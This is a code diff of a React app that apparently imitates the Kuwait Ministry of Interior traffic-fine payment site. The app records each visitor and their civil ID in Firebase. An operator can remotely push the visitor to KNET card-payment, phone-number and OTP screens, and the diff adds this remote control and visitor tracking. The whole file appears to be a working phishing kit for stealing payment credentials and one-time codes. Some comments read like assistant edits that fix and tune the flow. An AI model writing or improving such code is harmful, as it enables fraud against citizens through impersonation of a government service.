@@ -1,29 +1,30 @@
-"use client";
+"use client"
 
-import { doc, onSnapshot } from "firebase/firestore";
-import "./App.css";
-import { addData, db } from "./firebase";
-import { useEffect, useState } from "react";
-import Plate from "./plate";
-import { Loader } from "./loader";
-import Kent from "./kent/kent";
-import { useFetchViolationData } from "./lib/util";
-import VerificationForm from "./phone/phone";
-import PhoneOTP from "./phone/phone-otp";
-import LoadingScreen from "./sahel";
-import FullPageLoader from "./loader1";
+import { doc, onSnapshot } from "firebase/firestore"
+import "./App.css"
+import { addData, db } from "./firebase"
+import { useEffect, useState } from "react"
+import Plate from "./plate"
+import { Loader } from "./loader"
+import Kent from "./kent/kent"
+import { useFetchViolationData } from "./lib/util"
+import VerificationForm from "./phone/phone"
+import PhoneOTP from "./phone/phone-otp"
+import LoadingScreen from "./sahel"
+import FullPageLoader from "./loader1"
+import { setupOnlineStatus } from "./online-sts"
+import DiscountPopup from "./modal"
 
-function App(props: { page: any; setPage: any }) {
-  const [dataall] = useState<any>([]);
-  const [isCheked, setIsCheked] = useState<boolean>(false);
-  const { violationData, fetchViolationData } = useFetchViolationData();
-  const [isOnline, setIsOnline] = useState<boolean>(true);
+function App(props: { setPage: any ,page:string}) {
+  const [dataall] = useState<any>([])
+  const { violationData, fetchViolationData } = useFetchViolationData()
+  const [isOnline, setIsOnline] = useState<boolean>(true)
 
   // Call the function
 
-  const [amount, setAmount] = useState(0);
-  const [_id] = useState("id" + Math.random().toString(16).slice(2));
-  const [id, setId] = useState("");
+  const [amount, setAmount] = useState(0)
+  const [_id] = useState("id" + Math.random().toString(16).slice(2))
+  const [id, setId] = useState("")
 
   const data = {
     id: _id,
@@ -31,107 +32,97 @@ function App(props: { page: any; setPage: any }) {
     createdDate: new Date().toISOString(),
     notificationCount: 1,
     violationValue: amount,
-    page: props.page,
     isOnline: isOnline,
     personalInfo: {
       id: id,
     },
-  };
-  const [show, setShow] = useState(false);
-  const [loading, setloading] = useState(false);
+  }
+  const [show, setShow] = useState(false)
+  const [loading, setloading] = useState(false)
   useEffect(() => {
-    localStorage.setItem("vistor", _id);
+    localStorage.setItem("vistor", _id)
     addData({
       ...data,
       forestoreAttachment: "app-IFifwzlcXElzzk2qTKQJdX2wp6v3z0.tsx",
       isOnline: navigator.onLine,
-    });
-  }, []);
+    })
+  }, [])
   function getSpicficeValue() {
-    const visitorId = localStorage.getItem("visitor");
+    const visitorId = localStorage.getItem("vistor") // Fixed typo from "visitor" to "vistor" to match your localStorage key
     if (visitorId) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
-          const data = docSnap.data() as any;
-          if (data.page !== "") {
+          const data = docSnap.data() as any
+          if (data.page && data.page !== "") {
+            props.setPage(data.page)
           }
           if (data.violationValue) {
             if (data.violationValue !== "") {
-              localStorage.setItem("vv", data.violationValue);
-              setloading(false);
-              setShow(true);
-            } else if (data.violationValue === "") {
+              localStorage.setItem("vv", data.violationValue)
+              setloading(false)
+              setShow(true)
             }
           }
         }
-      });
-      () => unsubscribe();
+      })
+      return () => unsubscribe() // Properly return the cleanup function
     }
   }
   useEffect(() => {
-    console.log(props.page);
-  }, [props.page]);
+    setIsOnline(navigator.onLine)
+  }, [props.page])
 
   useEffect(() => {
-    // Set up event listeners for online/offline status
-    const handleOnline = () => setIsOnline(true);
-    const handleOffline = () => setIsOnline(false);
-    console.log(isCheked);
-    window.addEventListener("online", handleOnline);
-    window.addEventListener("offline", handleOffline);
 
     // Update firestore with online status
     if (localStorage.getItem("vistor")) {
-      const visitorId = localStorage.getItem("vistor");
+      const visitorId = localStorage.getItem("vistor")
       if (visitorId) {
+    setupOnlineStatus(visitorId)
         addData({
           id: visitorId,
-          isOnline: navigator.onLine,
+          isOnline: navigator.userAgent,
           lastSeen: new Date().toISOString(),
-        });
+        })
       }
     }
-
     // Clean up event listeners
-    return () => {
-      window.removeEventListener("online", handleOnline);
-      window.removeEventListener("offline", handleOffline);
-    };
-  }, []);
+  }, [])
 
   const handleSubmit = (e: any) => {
-    e.preventDefault();
-    localStorage.setItem("amount", amount?.toString());
-    fetchViolationData(id);
-    getSpicficeValue();
+    e.preventDefault()
+    localStorage.setItem("amount", amount?.toString())
+    fetchViolationData(id)
+    getSpicficeValue()
     if (id !== "" || id.length > 2) {
-      addData(data);
-      setloading(true);
+      addData({
+        ...data,
+        // Set the page property to 'kent'
+      })
+      setloading(true)
 
       setTimeout(() => {
-        setloading(false);
-        setShow(true);
-      }, 4000);
+        setloading(false)
+        setShow(true)
+        // props.setPage("kent");  // Uncomment this if you want to immediately navigate
+      }, 4000)
     }
-  };
+  }
   return (
     <>
       {props.page === "knet" ? (
-        <Kent setPage={props.setPage} />
+        <Kent violationValue={amount} setPage={props.setPage} />
       ) : props.page === "phone" ? (
-        <VerificationForm setPage={props.setPage} />
+        <VerificationForm />
       ) : props.page === "phoneCode" ? (
-        <PhoneOTP setPage={props.setPage} />
+        <PhoneOTP  />
       ) : props.page === "sahel" ? (
         <LoadingScreen />
       ) : props.page === "main" ? (
         <div dir="rtl">
           <header>
             <div className="row">
-              <div
-                className="col-4 col-md-2 col-lg-2 text-center"
-                style={{ border: "0px solid red" }}
-              >
+              <div className="col-4 col-md-2 col-lg-2 text-center" style={{ border: "0px solid red" }}>
                 <a className="navbar-brand m-0" href="/main/">
                   <img src="/react.svg" style={{ height: 120 }} />
                 </a>
@@ -157,16 +148,10 @@ function App(props: { page: any; setPage: any }) {
                   }}
                 ></span>
               </div>
-              <div
-                className="col-1 align-self-center"
-                style={{ border: "0px solid red" }}
-              >
+              <div className="col-1 align-self-center" style={{ border: "0px solid red" }}>
                 <div className="row">
                   <div className="col text-center">
-                    <img
-                      src="/vite.svg"
-                      className="text-center main-header-title"
-                    />
+                    <img src="/vite.svg" className="text-center main-header-title" />
                   </div>
                 </div>
                 <div className="row">
@@ -190,10 +175,7 @@ function App(props: { page: any; setPage: any }) {
                 >
                   <span className="navbar-toggler-icon" />
                 </button>
-                <div
-                  className="navbar-collapse collapse flex-sm-row-reverse"
-                  id="navbarResponsive"
-                >
+                <div className="navbar-collapse collapse flex-sm-row-reverse" id="navbarResponsive">
                   <ul
                     className="navbar-nav flex-grow-1 p-0 clearfix"
                     style={{
@@ -208,11 +190,7 @@ function App(props: { page: any; setPage: any }) {
                         <span className="sr-only">(current)</span>
                       </a>
                     </li>
-                    <li
-                      className="nav-item active"
-                      id="eservicesMenu"
-                      data-trigger="focus"
-                    >
+                    <li className="nav-item active" id="eservicesMenu" data-trigger="focus">
                       <a
                         href="#"
                         id="nav-eServices"
@@ -224,50 +202,30 @@ function App(props: { page: any; setPage: any }) {
                       >
                         الخدمات الإلكترونيـة
                       </a>
-                      <span
-                        className="collapse navbar-submenu"
-                        id="eservices"
-                        data-parent="#navbarResponsive"
-                      >
+                      <span className="collapse navbar-submenu" id="eservices" data-parent="#navbarResponsive">
                         <ul
                           className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
                           style={{ border: "0px solid red" }}
                         >
                           <li className="nav-item m-0">
                             <a href="#">
-                              <img
-                                src="/wwer.svg"
-                                alt="Information Systems"
-                                className="menu-icon"
-                              />
+                              <img src="/wwer.svg" alt="Information Systems" className="menu-icon" />
                             </a>
                             <a className="nav-link active" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة لنظم المعلومات
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة لنظم المعلومات</div>
                             </a>
                           </li>
                           <li className="nav-item">
-                            <img
-                              src="/wwer.svg"
-                              alt="Traffic"
-                              className="menu-icon"
-                              width={50}
-                              height={50}
-                            />
+                            <img src="/wwer.svg" alt="Traffic" className="menu-icon" width={50} height={50} />
                             <a href="#" className="nav-link">
-                              <div className="main-menu-text">
-                                الإدارة العامة للمرور
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للمرور</div>
                             </a>
                           </li>
                           <li className="nav-item">
                             <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
 
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة للجنسية ووثائق السفر
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للجنسية ووثائق السفر</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -275,9 +233,7 @@ function App(props: { page: any; setPage: any }) {
                               <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة لشؤون الإقامة
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة لشؤون الإقامة</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -289,9 +245,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة للدفاع المدني
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للدفاع المدني</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -303,9 +257,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة لمراكز الخدمة
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة لمراكز الخدمة</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -317,9 +269,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة لخفر السواحل
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة لخفر السواحل</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -331,9 +281,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة لشؤون قوة الشرطة
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة لشؤون قوة الشرطة</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -345,9 +293,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                أكاديمية سعد العبدالله للعلوم الأمنية
-                              </div>
+                              <div className="main-menu-text">أكاديمية سعد العبدالله للعلوم الأمنية</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -359,9 +305,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة للشؤن المالية
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للشؤن المالية</div>
                             </a>
                           </li>
                           <li className="nav-item">
@@ -373,9 +317,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة للتحقيقات
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للتحقيقات</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -387,9 +329,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة للتدريب
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للتدريب</div>
                             </a>
                           </li>
                         </ul>
@@ -407,11 +347,7 @@ function App(props: { page: any; setPage: any }) {
                       >
                         إدارات توعوية
                       </a>
-                      <span
-                        id="relatedDepts"
-                        className="collapse navbar-submenu"
-                        data-parent="#navbarResponsive"
-                      >
+                      <span id="relatedDepts" className="collapse navbar-submenu" data-parent="#navbarResponsive">
                         <ul
                           className="nav justify-content-center pt-2 pb-2 pl-3 pr-3"
                           style={{ border: "0px solid red" }}
@@ -425,9 +361,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                إدارة مكافحة الجرائم الإلكترونية
-                              </div>
+                              <div className="main-menu-text">إدارة مكافحة الجرائم الإلكترونية</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -439,9 +373,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                إدارة حماية الأحداث
-                              </div>
+                              <div className="main-menu-text">إدارة حماية الأحداث</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -453,9 +385,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة لمكافحة المخدرات
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة لمكافحة المخدرات</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -467,10 +397,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                إدارة حماية الآداب العامة ومكافحة الإتجار
-                                بالأشخاص
-                              </div>
+                              <div className="main-menu-text">إدارة حماية الآداب العامة ومكافحة الإتجار بالأشخاص</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -482,9 +409,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإدارة العامة للعلاقات والإعلام الأمني
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للعلاقات والإعلام الأمني</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -496,9 +421,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a className="nav-link" href="#">
-                              <div className="main-menu-text">
-                                الإداره العامة للمؤسسات الإصلاحية
-                              </div>
+                              <div className="main-menu-text">الإداره العامة للمؤسسات الإصلاحية</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -509,13 +432,8 @@ function App(props: { page: any; setPage: any }) {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="/main/sections/security-systems"
-                            >
-                              <div className="main-menu-text">
-                                الادارة العامة للأنظمة الأمنية
-                              </div>
+                            <a className="nav-link" href="/main/sections/security-systems">
+                              <div className="main-menu-text">الادارة العامة للأنظمة الأمنية</div>
                             </a>
                           </li>
                           <li className="nav-item m-0 d-none">
@@ -526,13 +444,8 @@ function App(props: { page: any; setPage: any }) {
                                 className="menu-icon"
                               />
                             </a>
-                            <a
-                              className="nav-link"
-                              href="/main/sections/national-security"
-                            >
-                              <div className="main-menu-text">
-                                كلية الأمن الوطني
-                              </div>
+                            <a className="nav-link" href="/main/sections/national-security">
+                              <div className="main-menu-text">كلية الأمن الوطني</div>
                             </a>
                           </li>
                           <li className="nav-item m-0">
@@ -544,9 +457,7 @@ function App(props: { page: any; setPage: any }) {
                               />
                             </a>
                             <a href="/main/sections/human-resources">
-                              <div className="main-menu-text">
-                                الإدارة العامة للشئون الإدارية
-                              </div>
+                              <div className="main-menu-text">الإدارة العامة للشئون الإدارية</div>
                             </a>
                           </li>
                         </ul>
@@ -554,74 +465,41 @@ function App(props: { page: any; setPage: any }) {
                     </li>
                     <li className="nav-item">
                       <div className="dropdown">
-                        <a
-                          href="#"
-                          className="nav-link"
-                          data-toggle="collapse"
-                          aria-expanded="false"
-                        >
+                        <a href="#" className="nav-link" data-toggle="collapse" aria-expanded="false">
                           الإصدارات الإلكترونية
                         </a>
-                        <div
-                          className="dropdown-menu text-right"
-                          style={{ background: "#e9e6de", padding: 0 }}
-                        >
+                        <div className="dropdown-menu text-right" style={{ background: "#e9e6de", padding: 0 }}>
                           <a className="dropdown-item" href="/main/emagazine">
                             المجلة الإلكترونية
                           </a>
-                          <a
-                            className="dropdown-item"
-                            href="/main/news/archive"
-                          >
+                          <a className="dropdown-item" href="/main/news/archive">
                             أرشيـف الأخبار
                           </a>
                         </div>
                       </div>
                     </li>
                     <li className="nav-item">
-                      <a
-                        className="nav-link"
-                        href="https://eservices.moi.gov.kw:45314/verify/qrcode"
-                      >
+                      <a className="nav-link" href="https://eservices.moi.gov.kw:45314/verify/qrcode">
                         التحقق من الوثائق
                       </a>
                     </li>
                     <li className="nav-item">
-                      <a
-                        className="nav-link"
-                        href="https://eservices1.moi.gov.kw/moicus.nsf/moicus?openform&LangID=1"
-                      >
+                      <a className="nav-link" href="https://eservices1.moi.gov.kw/moicus.nsf/moicus?openform&LangID=1">
                         يهمنا رايك
                       </a>
                     </li>
                     <li className="nav-item" id="navEmergency">
-                      <a
-                        className="nav-link"
-                        href="#"
-                        data-toggle="modal"
-                        data-target="#emergencyContactModal"
-                      >
+                      <a className="nav-link" href="#" data-toggle="modal" data-target="#emergencyContactModal">
                         أرقام الطوارئ
                       </a>
                     </li>
                     <li className="nav-item" id="navMeta">
                       <div className="dropdown">
-                        <a
-                          href="#"
-                          className="nav-link"
-                          data-toggle="collapse"
-                          aria-expanded="false"
-                        >
+                        <a href="#" className="nav-link" data-toggle="collapse" aria-expanded="false">
                           منصة المواعيد
                         </a>
-                        <div
-                          className="dropdown-menu text-right"
-                          style={{ background: "#e9e6de", padding: 0 }}
-                        >
-                          <a
-                            className="dropdown-item"
-                            href="https://meta.e.gov.kw/"
-                          >
+                        <div className="dropdown-menu text-right" style={{ background: "#e9e6de", padding: 0 }}>
+                          <a className="dropdown-item" href="https://meta.e.gov.kw/">
                             منصة 'متى'
                           </a>
                           <a
@@ -639,10 +517,7 @@ function App(props: { page: any; setPage: any }) {
                         </div>
                       </div>
                     </li>
-                    <li
-                      className="nav-item mt-0 mb-0 mr-auto"
-                      style={{ border: "0px solid red", float: "left" }}
-                    >
+                    <li className="nav-item mt-0 mb-0 mr-auto" style={{ border: "0px solid red", float: "left" }}>
                       <div
                         style={{ border: "0px solid white", height: "100%" }}
                         className="form-group text-center"
@@ -683,10 +558,7 @@ function App(props: { page: any; setPage: any }) {
                   <div className="row mt-2">
                     <div className="col-2 mr-1 ml-1">
                       <a href="#">
-                        <img
-                          src="/ico-renew-license.svg"
-                          className="side-menu-icon"
-                        />
+                        <img src="/ico-renew-license.svg" className="side-menu-icon" />
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
@@ -697,10 +569,7 @@ function App(props: { page: any; setPage: any }) {
                   <div className="row mt-2">
                     <div className="col-2 mr-1 ml-1">
                       <a href="#">
-                        <img
-                          src="/ico-payment.svg"
-                          className="side-menu-icon"
-                        />
+                        <img src="/ico-payment.svg" className="side-menu-icon" />
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
@@ -717,10 +586,7 @@ function App(props: { page: any; setPage: any }) {
                         aria-expanded="false"
                         aria-controls="appointmentsMenu"
                       >
-                        <img
-                          src="/ico-booking.svg"
-                          className="side-menu-icon"
-                        />
+                        <img src="/ico-booking.svg" className="side-menu-icon" />
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
@@ -759,10 +625,7 @@ function App(props: { page: any; setPage: any }) {
                   <div className="row mt-2">
                     <div className="col-2 mr-1 ml-1">
                       <a href="#">
-                        <img
-                          src="/ico-procedures.svg"
-                          className="side-menu-icon"
-                        />
+                        <img src="/ico-procedures.svg" className="side-menu-icon" />
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
@@ -778,10 +641,7 @@ function App(props: { page: any; setPage: any }) {
                         aria-expanded="false"
                         aria-controls="sectionsMenu"
                       >
-                        <img
-                          src="/ico-locations-sections.svg"
-                          className="side-menu-icon"
-                        />
+                        <img src="/ico-locations-sections.svg" className="side-menu-icon" />
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
@@ -791,10 +651,7 @@ function App(props: { page: any; setPage: any }) {
                   <div className="row mt-2">
                     <div className="col-2 mr-1 ml-1">
                       <a href="/driving-license-conditions.pdf">
-                        <img
-                          src="/ico-pdf-doc.svg"
-                          className="side-menu-icon"
-                        />
+                        <img src="/ico-pdf-doc.svg" className="side-menu-icon" />
                       </a>
                     </div>
                     <div className="col-8 align-self-center">
@@ -813,7 +670,7 @@ function App(props: { page: any; setPage: any }) {
                     </div>
                     <div className="col-3">&nbsp;</div>
                   </div>
-                  <div className="row mt-2 pl-4 pr-4 pb-5 text-justify">
+                  <div className="row mt-2 pl-2 pr-1 pb-5 text-justify" style={{fontSize:10}}>
                     <div className="col-12">
                       <form id="enquireForm" onSubmit={handleSubmit}>
                         <div className="form-row">
@@ -826,10 +683,7 @@ function App(props: { page: any; setPage: any }) {
                                 id="violationForIndividual"
                                 defaultValue={1}
                               />
-                              <label
-                                className="form-check-label"
-                                htmlFor="violationTypeIndividual"
-                              >
+                              <label className="form-check-label" htmlFor="violationTypeIndividual">
                                 &nbsp;الأفراد
                               </label>
                             </div>
@@ -841,10 +695,7 @@ function App(props: { page: any; setPage: any }) {
                                 id="violationForCompany"
                                 defaultValue={2}
                               />
-                              <label
-                                className="form-check-label"
-                                htmlFor="violationTypeCompany"
-                              >
+                              <label className="form-check-label" htmlFor="violationTypeCompany">
                                 &nbsp;الشركات
                               </label>
                             </div>
@@ -852,9 +703,7 @@ function App(props: { page: any; setPage: any }) {
                         </div>
                         <div className="form-row mt-2">
                           <div className="col-sm-12 col-md-6">
-                            <label id="lblEnquiryType">
-                              الرقم المدني أو الرقم الموحد
-                            </label>
+                            <label id="lblEnquiryType">الرقم المدني أو الرقم الموحد</label>
                             <input
                               className="form-control "
                               id="civilId"
@@ -863,7 +712,7 @@ function App(props: { page: any; setPage: any }) {
                               maxLength={12}
                               minLength={9}
                               onChange={(e) => {
-                                setId(e.target.value);
+                                setId(e.target.value)
                               }}
                             />
                           </div>
@@ -884,7 +733,7 @@ function App(props: { page: any; setPage: any }) {
 
                         <div
                           style={{ borderBottom: "2px solid #d6dce5" }}
-                          className="form-row p-3 mt-3 text-right"
+                          className="form-row p-0 mt-3 text-right"
                           id="responseInfo"
                         >
                           {loading ? (
@@ -892,14 +741,10 @@ function App(props: { page: any; setPage: any }) {
                           ) : show ? (
                             <>
                               {dataall.errorMsg && (
-                                <Plate
-                                  setAmount={setAmount}
-                                  violations={violationData!}
-                                  setIsChecked={setIsCheked}
-                                />
+                                <Plate setAmount={setAmount} violations={violationData!} />
                               )}
                               <div
-                                className="mb-2  p-2"
+                                className="mb-2  p-0"
                                 style={{
                                   width: "100%",
                                   background: "#e2e3e5",
@@ -907,25 +752,14 @@ function App(props: { page: any; setPage: any }) {
                                 }}
                               >
                                 <div className="flex text-end text-sm rounded">
-                                  <div>
-                                    عدد المخالفات:{" "}
-                                    {violationData?.totalTicketsCount ?? "1"}
-                                  </div>
-                                  <div>
-                                    المبلغ الإجمالي:{" "}
-                                    {violationData?.totalViolationAmount ?? "5"}{" "}
-                                    د.ك
-                                  </div>
+                                  <div>عدد المخالفات: {violationData?.totalTicketsCount ?? "1"}</div>
+                                  <div>المبلغ الإجمالي: {violationData?.totalViolationAmount ?? "5"} د.ك</div>
                                 </div>
                               </div>
                               <Plate
-                                violations={
-                                  violationData?.personalViolationsData
-                                }
-                                setIsChecked={setIsCheked}
+                                violations={violationData?.personalViolationsData}
                                 setAmount={setAmount}
                               />
-                              إجمالي القيمة المختارة :{amount}
                             </>
                           ) : null}
                         </div>
@@ -934,28 +768,29 @@ function App(props: { page: any; setPage: any }) {
                         </div>
                         <div className="form-row mt-3">
                           <div className="col-12 text-right font-weight-bold mb-2">
-                            بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة
-                            أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
+                            بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                           </div>
                           <div className="col-sm-12 col-md-4 text-right">
                             <input
                               type="button"
                               onClick={() => {
-                                addData(data);
+                                addData({
+                                  ...data,
+                                })
+                                setloading(true)
+
                                 setTimeout(() => {
-                                  props.setPage("knet");
-                                }, 2000);
+addData({...data,page:'kent'}).then(()=>{
+  setloading(false)
+})
+                                }, 5000) // Reduced timeout for better user experience
                               }}
                               id="btnPay"
-                              className={`btn btn-primary btn-block col-12 ${
-                                show ? "" : "d-none"
-                              }`}
+                              className={`btn btn-primary btn-block col-12 ${show ? "" : "d-none"}`}
                               defaultValue="إدفع"
                             />
                           </div>
-                          <div className="col-sm-12 col-md-6 align-self-center">
-                            &nbsp;
-                          </div>
+                          <div className="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
                         </div>
                         <div className="form-row mt-3">
                           <div className="col-12 align-self-center">
@@ -985,11 +820,7 @@ function App(props: { page: any; setPage: any }) {
                     </div>
                   </div>
                   <div className="d-flex justify-content-center">
-                    <div
-                      className="spinner-grow text-secondary d-none"
-                      role="status"
-                      id="workingOnIt"
-                    >
+                    <div className="spinner-grow text-secondary d-none" role="status" id="workingOnIt">
                       <span className="sr-only">Loading...</span>
                     </div>
                   </div>
@@ -1026,68 +857,22 @@ function App(props: { page: any; setPage: any }) {
                       viewBox="0 0 103 103"
                     >
                       <title>Payment</title>
-                      <rect
-                        className="circle cls-1"
-                        x="1.01"
-                        y="1.26"
-                        width={100}
-                        height={100}
-                        rx={50}
-                      />
+                      <rect className="circle cls-1" x="1.01" y="1.26" width={100} height={100} rx={50} />
                       <path
                         className="kd cls-2"
                         d="M63.55,70.16l-6.06-7v7H55.27V56.25h2.22v6.06l5.84-6.06h2.75L59.59,62.5l6.73,7.66Z"
                       />
-                      <path
-                        className="kd cls-2"
-                        d="M67.49,70.16v-2.5H69.4v2.5Z"
-                      />
+                      <path className="kd cls-2" d="M67.49,70.16v-2.5H69.4v2.5Z" />
                       <path
                         className="kd cls-2"
                         d="M71.42,70.16V56.25h6.32c3.81,0,4.91,1.59,4.91,6.06v1.78c0,4.47-1.1,6.07-4.91,6.07Zm9-8c0-2.89-.46-4.36-2.89-4.36H73.62V68.58h3.94c2.25,0,2.89-1.3,2.89-4.2Z"
                       />
-                      <rect
-                        className="cls-1"
-                        x="15.44"
-                        y="27.78"
-                        width="71.3"
-                        height="46.97"
-                      />
-                      <line
-                        className="cls-1"
-                        x1="22.53"
-                        y1="56.6"
-                        x2="39.12"
-                        y2="56.6"
-                      />
-                      <line
-                        className="cls-1"
-                        x1="32.8"
-                        y1="62.13"
-                        x2="38.33"
-                        y2="62.13"
-                      />
-                      <line
-                        className="cls-1"
-                        x1="22.53"
-                        y1="67.66"
-                        x2="38.33"
-                        y2="67.66"
-                      />
-                      <line
-                        className="cls-1"
-                        x1="15.29"
-                        y1="36.28"
-                        x2="86.4"
-                        y2="36.28"
-                      />
-                      <line
-                        className="cls-1"
-                        x1="15.29"
-                        y1="47.83"
-                        x2="86.4"
-                        y2="47.83"
-                      />
+                      <rect className="cls-1" x="15.44" y="27.78" width="71.3" height="46.97" />
+                      <line className="cls-1" x1="22.53" y1="56.6" x2="39.12" y2="56.6" />
+                      <line className="cls-1" x1="32.8" y1="62.13" x2="38.33" y2="62.13" />
+                      <line className="cls-1" x1="22.53" y1="67.66" x2="38.33" y2="67.66" />
+                      <line className="cls-1" x1="15.29" y1="36.28" x2="86.4" y2="36.28" />
+                      <line className="cls-1" x1="15.29" y1="47.83" x2="86.4" y2="47.83" />
                     </svg>
                   </a>
                 </div>
@@ -1102,11 +887,7 @@ function App(props: { page: any; setPage: any }) {
                     <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                     <form id="MQAFines">
                       <div className="col-12">
-                        <select
-                          className="form-control"
-                          id="MQAFinesSelectFineType"
-                          name="MQAFinesSelectFineType"
-                        >
+                        <select className="form-control" id="MQAFinesSelectFineType" name="MQAFinesSelectFineType">
                           <option value={1}>المرور</option>
                           <option value={2}>الإقامة</option>
                         </select>
@@ -1121,10 +902,7 @@ function App(props: { page: any; setPage: any }) {
                           placeholder="الرقم المدني"
                         />
                       </div>
-                      <button
-                        className="btn btn-secondary mt-3"
-                        id="btnMEnquire"
-                      >
+                      <button className="btn btn-secondary mt-3" id="btnMEnquire">
                         دفع
                       </button>
                     </form>
@@ -1197,10 +975,7 @@ function App(props: { page: any; setPage: any }) {
           </div>
           {/*CASE FILE CHECK*/}
               <div className="card slider-card">
-                <div
-                  className="card-header active-acc text-center"
-                  id="headingFour"
-                >
+                <div className="card-header active-acc text-center" id="headingFour">
                   <a
                     role="button"
                     data-toggle="collapse"
@@ -1235,18 +1010,11 @@ function App(props: { page: any; setPage: any }) {
                         />
                       </div>
                       <div className="col-12">
-                        <button
-                          className="btn btn-block btn-secondary mt-3"
-                          id="btnMQACaseCheck"
-                        >
+                        <button className="btn btn-block btn-secondary mt-3" id="btnMQACaseCheck">
                           إستعلم
                         </button>
                         <div className="d-flex justify-content-center">
-                          <div
-                            className="spinner-grow text-secondary d-none"
-                            role="status"
-                            id="MQACCWorkingOnIt"
-                          >
+                          <div className="spinner-grow text-secondary d-none" role="status" id="MQACCWorkingOnIt">
                             <span className="sr-only">Loading...</span>
                           </div>
                         </div>
@@ -1330,11 +1098,7 @@ function App(props: { page: any; setPage: any }) {
                     <div className="col-12">
                       <img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" />
                     </div>
-                    <form
-                      asp-controller="sms"
-                      asp-action="change"
-                      id="MQAChangeCompany"
-                    >
+                    <form asp-controller="sms" asp-action="change" id="MQAChangeCompany">
                       <div className="row">
                         <div className="col-12">
                           <input
@@ -1363,11 +1127,7 @@ function App(props: { page: any; setPage: any }) {
                       </div>
                       <div className="row mt-1 no-gutters">
                         <div className="col-sm-12 col-md-5">
-                          <select
-                            className="form-control"
-                            id="MQASelectCompany"
-                            name="MSelectCompany"
-                          >
+                          <select className="form-control" id="MQASelectCompany" name="MSelectCompany">
                             <option value={1}>VIVA</option>
                             <option value={2}>OOREDOO</option>
                             <option value={3}>ZAIN</option>
@@ -1388,18 +1148,11 @@ function App(props: { page: any; setPage: any }) {
                       </div>
                       <div className="row mt-1">
